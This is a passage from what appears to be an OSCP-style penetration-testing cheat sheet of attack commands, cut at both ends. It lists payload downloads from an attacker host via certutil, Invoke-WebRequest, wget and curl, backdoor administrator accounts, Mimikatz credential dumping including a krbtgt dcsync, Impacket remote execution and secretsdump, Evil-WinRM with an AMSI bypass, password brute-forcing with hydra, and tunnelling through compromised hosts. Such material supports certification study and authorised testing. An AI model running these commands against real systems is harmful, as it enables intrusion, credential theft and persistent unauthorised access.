</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">This</span> <span class="nx">created</span> <span class="nx">both</span> <span class="nx">id_rsa</span> <span class="nx">and</span> <span class="nx">id_rsa</span><span class="p">.</span><span class="nx">pub</span> <span class="k">in</span> <span class="o">~</span><span class="err">/.ssh directory</span>
</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">Copy</span> <span class="nx">the</span> <span class="nx">content</span> <span class="k">in</span> <span class="s2">&#34;id_rsa.pub&#34;</span> <span class="nx">and</span> <span class="nx">create</span> <span class="s2">&#34;.ssh&#34;</span> <span class="nx">directory</span> <span class="k">in</span> <span class="err">/home of target machine.</span>
</span></span><span class="line"><span class="cl"><span class="nx">chmod</span> <span class="mi">700</span> <span class="o">~</span><span class="err">/.ssh</span>
</span></span><span class="line"><span class="cl"><span class="nx">nano</span> <span class="o">~</span><span class="err">/.ssh/authorized_keys #enter the copied content here</span>
</span></span><span class="line"><span class="cl"><span class="nx">chmod</span> <span class="mi">600</span> <span class="o">~</span><span class="err">/.ssh/authorized_keys </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">On</span> <span class="nx">Attacker</span> <span class="nx">machine</span>
</span></span><span class="line"><span class="cl"><span class="nx">ssh</span> <span class="nx">username</span><span class="err">@</span><span class="nx">target_ip</span> <span class="err">#</span><span class="nx">enter</span> <span class="nx">password</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">gave</span> <span class="nx">any</span>
</span></span></code></pre></div><h2 id="file-transfers">File Transfers</h2>
<ul>
<li>Netcat</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Attacker</span>
</span></span><span class="line"><span class="cl">nc &lt;target_ip&gt; <span class="m">1234</span> &lt; nmap
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Target</span>
</span></span><span class="line"><span class="cl">nc -lvp <span class="m">1234</span> &gt; nmap
</span></span></code></pre></div><ul>
<li>Downloading on Windows</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-command</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">LHOST</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">LPORT</span><span class="p">&gt;/&lt;</span><span class="n">FILE</span><span class="p">&gt;</span> <span class="n">-Outfile</span> <span class="n">C:</span><span class="p">\\</span><span class="n">temp</span><span class="p">\\&lt;</span><span class="n">FILE</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">lhost</span><span class="p">/</span><span class="n">file</span> <span class="n">-Outfile</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="s2">&#34;http://&lt;LHOST&gt;/&lt;FILE&gt;&#34;</span> <span class="p">&lt;</span><span class="n">FILE</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="p">\\</span><span class="n">kali</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">file</span> <span class="p">.</span>
</span></span></code></pre></div><ul>
<li>Downloading on Linux</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">wget </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">lhost</span><span class="p">/</span><span class="n">file</span>
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">http</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">LHOST</span><span class="p">&gt;/&lt;</span><span class="n">FILE</span><span class="p">&gt;</span> <span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">OUTPUT_FILE</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="windows-to-kali">Windows to Kali</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kali</span><span class="p">&gt;</span> <span class="nb">impacket-smbserver</span> <span class="n">-smb2support</span> <span class="p">&lt;</span><span class="n">sharename</span><span class="p">&gt;</span> <span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">win</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="n">file</span> <span class="p">\\</span><span class="n">KaliIP</span><span class="p">\</span><span class="n">sharename</span>
</span></span></code></pre></div><h2 id="adding-users">Adding Users</h2>
<h3 id="windows">Windows</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">user</span> <span class="n">hacker</span> <span class="n">hacker123</span> <span class="p">/</span><span class="n">add</span>
</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">hacker</span> <span class="p">/</span><span class="n">add</span>
</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">localgroup</span> <span class="s2">&#34;Remote Desktop Users&#34;</span> <span class="n">hacker</span> <span class="p">/</span><span class="n">ADD</span>
</span></span></code></pre></div><h3 id="linux">Linux</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">adduser</span> <span class="p">&lt;</span><span class="n">uname</span><span class="p">&gt;</span> <span class="c">#Interactive</span>
</span></span><span class="line"><span class="cl"><span class="n">useradd</span> <span class="p">&lt;</span><span class="n">uname</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">useradd</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">UID</span><span class="p">&gt;</span> <span class="n">-g</span> <span class="p">&lt;</span><span class="n">group</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">uname</span><span class="p">&gt;</span>  <span class="c">#UID can be something new than existing, this command is to add a user to a specific group</span>
</span></span></code></pre></div><h2 id="password-hash-cracking">Password-Hash Cracking</h2>
<p><em>Hash Analyzer</em>: <a href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a></p>
<h3 id="fcrackzip">fcrackzip</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">fcrackzip</span> <span class="n">-u</span> <span class="n">-D</span> <span class="n">-p</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span> <span class="p">&lt;</span><span class="n">FILE</span><span class="p">&gt;.</span><span class="py">zip</span> <span class="c">#Cracking zip files</span>
</span></span></code></pre></div><h3 id="john">John</h3>
<blockquote>
<p><a href="https://github.com/openwall/john/tree/bleeding-jumbo/run">https://github.com/openwall/john/tree/bleeding-jumbo/run</a></p></blockquote>
<ul>
<li>If there’s an encrypted file, convert it into john hash and crack.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ssh2john</span><span class="p">.</span><span class="py">py</span> <span class="n">id_rsa</span> <span class="p">&gt;</span> <span class="n">hash</span>
</span></span><span class="line"><span class="cl"><span class="c">#Convert the obtained hash to John format(above link)</span>
</span></span><span class="line"><span class="cl"><span class="n">john</span> <span class="n">hashfile</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><h3 id="hashcat">Hashcat</h3>
<blockquote>
<p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Obtain the Hash module number </span>
</span></span><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-m</span> <span class="p">&lt;</span><span class="n">number</span><span class="p">&gt;</span> <span class="n">hash</span> <span class="n">wordlists</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-force</span>
</span></span></code></pre></div><h2 id="pivoting-through-ssh">Pivoting through SSH</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh adminuser@10.10.155.5 -i id_rsa -D <span class="m">9050</span> <span class="c1">#TOR port</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Change the info in /etc/proxychains4.conf also enable &#34;Quiet Mode&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 10.10.10.0/24 <span class="c1">#Example</span>
</span></span></code></pre></div><h2 id="dealing-with-passwords">Dealing with Passwords</h2>
<ul>
<li>When there’s a scope for bruteforce or hash-cracking then try the following,
<ul>
<li>Have a valid username first</li>
<li>Don&rsquo;t forget trying <code>admin:admin</code></li>
<li>Try <code>username:username</code> as first credential</li>
<li>If it’s related to a service, try default passwords.</li>
<li>The service name is the username, and the same name is used for the password.</li>
<li>Use Rockyou.txt</li>
</ul>
</li>
<li>Some default passwords to always try out!</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">password</span>
</span></span><span class="line"><span class="cl"><span class="nx">password1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Password1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Password</span><span class="err">@</span><span class="mi">123</span>
</span></span><span class="line"><span class="cl"><span class="nx">password</span><span class="err">@</span><span class="mi">123</span>
</span></span><span class="line"><span class="cl"><span class="nx">admin</span>
</span></span><span class="line"><span class="cl"><span class="nx">administrator</span>
</span></span><span class="line"><span class="cl"><span class="nx">admin</span><span class="err">@</span><span class="mi">123</span>
</span></span></code></pre></div><h2 id="impacket">Impacket</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>:<span class="o">[</span>password/password hash<span class="o">]</span>@<span class="o">[</span>Target IP Address<span class="o">]</span> <span class="c1">#we connect to the server rather than a share</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lookupsid.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>:<span class="o">[</span>password/password hash<span class="o">]</span>@<span class="o">[</span>Target IP Address<span class="o">]</span> <span class="c1">#User enumeration on target</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">services.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>:<span class="o">[</span>Password/Password Hash<span class="o">]</span>@<span class="o">[</span>Target IP Address<span class="o">]</span> <span class="o">[</span>Action<span class="o">]</span> <span class="c1">#service enumeration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">secretsdump.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>:<span class="o">[</span>password/password hash<span class="o">]</span>@<span class="o">[</span>Target IP Address<span class="o">]</span>  <span class="c1">#Dumping hashes on target</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GetUserSPNs.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>:<span class="o">[</span>password/password hash<span class="o">]</span>@<span class="o">[</span>Target IP Address<span class="o">]</span> -dc-ip &lt;IP&gt; -request  <span class="c1">#Kerberoasting, and request option dumps TGS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GetNPUsers.py test.local/ -dc-ip &lt;IP&gt; -usersfile usernames.txt -format hashcat -outputfile hashes.txt <span class="c1">#Asreproasting, need to provide usernames list</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##RCE</span>
</span></span><span class="line"><span class="cl">psexec.py test.local/john:password123@10.10.10.1
</span></span><span class="line"><span class="cl">psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wmiexec.py test.local/john:password123@10.10.10.1
</span></span><span class="line"><span class="cl">wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">smbexec.py test.local/john:password123@10.10.10.1
</span></span><span class="line"><span class="cl">smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">atexec.py test.local/john:password123@10.10.10.1 &lt;command&gt;
</span></span><span class="line"><span class="cl">atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 &lt;command&gt;
</span></span></code></pre></div><h2 id="evil-winrm">Evil-Winrm</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">##winrm service discovery</span>
</span></span><span class="line"><span class="cl">nmap -p5985,5986 &lt;IP&gt;
</span></span><span class="line"><span class="cl"><span class="m">5985</span> - plaintext protocol
</span></span><span class="line"><span class="cl"><span class="m">5986</span> - encrypted
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##Login with password</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -p pass
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -p pass -S <span class="c1">#if 5986 port is open</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##Login with Hash</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -H ntlmhash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##Login with key</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -c certificate.pem -k priv-key.pem -S <span class="c1">#-c for public key and -k for private key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##Logs</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -p pass -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##File upload and download</span>
</span></span><span class="line"><span class="cl">upload &lt;file&gt;
</span></span><span class="line"><span class="cl">download &lt;file&gt; &lt;filepath-kali&gt; <span class="c1">#not required to provide path all time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##Loading files direclty from Kali location</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -p pass -s /opt/privsc/powershell <span class="c1">#Location can be different</span>
</span></span><span class="line"><span class="cl">Bypass-4MSI
</span></span><span class="line"><span class="cl">Invoke-Mimikatz.ps1
</span></span><span class="line"><span class="cl">Invoke-Mimikatz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##evil-winrm commands</span>
</span></span><span class="line"><span class="cl">menu <span class="c1"># to view commands</span>
</span></span><span class="line"><span class="cl"><span class="c1">#There are several commands to run</span>
</span></span><span class="line"><span class="cl"><span class="c1">#This is an example for running a binary</span>
</span></span><span class="line"><span class="cl">evil-winrm -i &lt;IP&gt; -u user -p pass -e /opt/privsc
</span></span><span class="line"><span class="cl">Bypass-4MSI
</span></span><span class="line"><span class="cl">menu
</span></span><span class="line"><span class="cl">Invoke-Binary /opt/privsc/winPEASx64.exe
</span></span></code></pre></div><h2 id="mimikatz">Mimikatz</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span> <span class="c">#hashes and plaintext passwords</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span> <span class="n">SystemBkup</span><span class="p">.</span><span class="py">hiv</span> <span class="n">SamBkup</span><span class="p">.</span><span class="py">hiv</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">krbtgt</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span> <span class="c">#both these dump SAM</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#OneLiner</span>
</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonpasswords&#34;</span> <span class="s2">&#34;exit&#34;</span>
</span></span></code></pre></div><h2 id="ligolo-ng">Ligolo-ng</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Creating interface and starting it.</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">ip</span> <span class="n">tuntap</span> <span class="n">add</span> <span class="n">user</span> <span class="vm">$</span><span class="p">(</span><span class="n">whoami</span><span class="p">)</span> <span class="n">mode</span> <span class="n">tun</span> <span class="n">ligolo</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">ip</span> <span class="n">link</span> <span class="nb">set </span><span class="n">ligolo</span> <span class="n">up</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Kali machine - Attacker machine</span>
</span></span><span class="line"><span class="cl"><span class="p">./</span><span class="n">proxy</span> <span class="n">-laddr</span> <span class="mf">0.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">0</span><span class="err">:</span><span class="mf">9001</span> <span class="n">-selfcert</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#windows or linux machine - compromised machine</span>
</span></span><span class="line"><span class="cl"><span class="n">agent</span><span class="p">.</span><span class="py">exe</span> <span class="n">-connect</span> <span class="p">&lt;</span><span class="n">LHOST</span><span class="p">&gt;</span><span class="err">:</span><span class="mf">9001</span> <span class="n">-ignore-cert</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#In Ligolo-ng console</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="c">#select host</span>
</span></span><span class="line"><span class="cl"><span class="n">ifconfig</span> <span class="c">#Notedown the internal network&#39;s subnet</span>
</span></span><span class="line"><span class="cl"><span class="nb">start </span><span class="c">#after adding relevent subnet to ligolo interface</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Adding subnet to ligolo interface - Kali linux</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">ip</span> <span class="nb">r </span><span class="n">add</span> <span class="p">&lt;</span><span class="n">subnet</span><span class="p">&gt;</span> <span class="n">dev</span> <span class="n">ligolo</span>
</span></span></code></pre></div><hr>
<h1 id="recon-and-enumeration">Recon and Enumeration</h1>
<ul>
<li>
<p>OSINT OR Passive Recon</p>
  <aside>
  💡 Not that useful for OSCP as we’ll be dealing with internal machines
  </aside>
<ul>
<li>whois: <code>whois &lt;domain&gt;</code> or <code>whois &lt;domain&gt; -h &lt;IP&gt;</code></li>
<li>Google Dorking,
<ul>
<li>site</li>
<li>filetype</li>
<li>intitle</li>
<li>GHDB - Google hacking database</li>
</ul>
</li>
<li>OS and Service Information using <a href="http://searchdns.netcraft.com">searchdns.netcraft.com</a></li>
<li>Github Dorking
<ul>
<li>filename</li>
<li>user</li>
<li>A tool called Gitleaks for automated enumeration</li>
</ul>
</li>
<li>Shodan dorks
<ul>
<li>hostname</li>
<li>port</li>
<li>Then gather information by going through the options</li>
</ul>
</li>
<li>Scanning Security headers and SSL/TLS using <a href="https://securityheaders.com/">https://securityheaders.com/</a></li>
</ul>
</li>
</ul>
<h2 id="port-scanning">Port Scanning</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#use -Pn option if you&#39;re getting nothing in the scan</span>
</span></span><span class="line"><span class="cl"><span class="n">nmap</span> <span class="n">-sC</span> <span class="n">-sV</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-v</span> <span class="c">#Basic scan</span>
</span></span><span class="line"><span class="cl"><span class="n">nmap</span> <span class="n">-T4</span> <span class="n">-A</span> <span class="n">-p</span><span class="p">-</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-v</span> <span class="c">#complete scan</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sV</span> <span class="n">-p</span> <span class="mf">443</span> <span class="p">-</span><span class="n">-script</span> <span class="s2">&#34;vuln&#34;</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="py">124</span> <span class="c">#running vuln category scripts</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#NSE</span>
</span></span><span class="line"><span class="cl"><span class="n">updatedb</span>
</span></span><span class="line"><span class="cl"><span class="n">locate</span> <span class="p">.</span><span class="py">nse</span> <span class="p">|</span> <span class="n">grep</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="s2">&#34;name&#34;</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="c">#here we can specify other options like specific ports...etc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="p">&lt;</span><span class="n">port</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>   <span class="c">#powershell utility</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">1</span><span class="p">.</span><span class="mf">.1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="py">Connect</span><span class="p">(</span><span class="s2">&#34;IP&#34;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">))</span> <span class="s2">&#34;TCP port </span><span class="nv">$_</span><span class="s2"> is open&#34;</span><span class="p">}</span> <span class="mf">2</span><span class="p">&gt;</span><span class="vm">$null</span> <span class="c">#automating port scan of first 1024 ports in powershell</span>
</span></span></code></pre></div><h2 id="ftp-enumeration">FTP enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">put</span> <span class="p">&lt;</span><span class="n">file</span><span class="p">&gt;</span> <span class="c">#uploading file</span>
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="p">&lt;</span><span class="n">file</span><span class="p">&gt;</span> <span class="c">#downloading file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#NSE</span>
</span></span><span class="line"><span class="cl"><span class="n">locate</span> <span class="p">.</span><span class="py">nse</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">ftp</span>
</span></span><span class="line"><span class="cl"><span class="n">nmap</span> <span class="n">-p21</span> <span class="p">-</span><span class="n">-script</span><span class="p">=&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="n">hydra</span> <span class="n">-L</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-P</span> <span class="n">passwords</span><span class="p">.</span><span class="py">txt</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">ftp</span> <span class="c">#&#39;-L&#39; for usernames list, &#39;-l&#39; for username and vice versa</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Check for vulnerabilities associated with the identified version.</span>
</span></span></code></pre></div><h2 id="ssh-enumeration">SSH enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Login</span>
</span></span><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">uname</span><span class="nv">@IP</span> <span class="c">#enter the password in the prompt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#id_rsa or id_ecdsa file</span>
</span></span><span class="line"><span class="cl"><span class="n">chmod</span> <span class="mf">600</span> <span class="n">id_rsa</span><span class="p">/</span><span class="n">id_ecdsa</span>
</span></span><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">uname</span><span class="nv">@IP</span> <span class="n">-i</span> <span class="n">id_rsa</span><span class="p">/</span><span class="n">id_ecdsa</span> <span class="c">#if it still asks for the password, crack it using John</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#cracking id_rsa or id_ecdsa</span>
</span></span><span class="line"><span class="cl"><span class="n">ssh2john</span> <span class="n">id_ecdsa</span><span class="p">(</span><span class="n">or</span><span class="p">)</span><span class="n">id_rsa</span> <span class="p">&gt;</span> <span class="n">hash</span>
</span></span><span class="line"><span class="cl"><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">sathvik</span><span class="p">/</span><span class="n">Wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span> <span class="n">hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="n">hydra</span> <span class="n">-l</span> <span class="n">uname</span> <span class="n">-P</span> <span class="n">passwords</span><span class="p">.</span><span class="py">txt</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">ssh</span> <span class="c">#&#39;-L&#39; for usernames list, &#39;-l&#39; for username and vice versa</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Check for vulnerabilities associated with the identified version.</span>
</span></span></code></pre></div><h2 id="smb-enumeration">SMB enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nbtscan</span> <span class="n">-r</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">0</span><span class="p">/</span><span class="mf">24</span> <span class="c">#IP or range can be provided</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#NSE scripts can be used</span>
</span></span><span class="line"><span class="cl"><span class="n">locate</span> <span class="p">.</span><span class="py">nse</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">smb</span>
</span></span><span class="line"><span class="cl"><span class="n">nmap</span> <span class="n">-p445</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="s2">&#34;name&#34;</span> <span class="nv">$IP</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#In windows we can view like this</span>
</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">view</span> <span class="p">\\&lt;</span><span class="n">computername</span><span class="p">/</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">all</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#crackmapexec</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span>
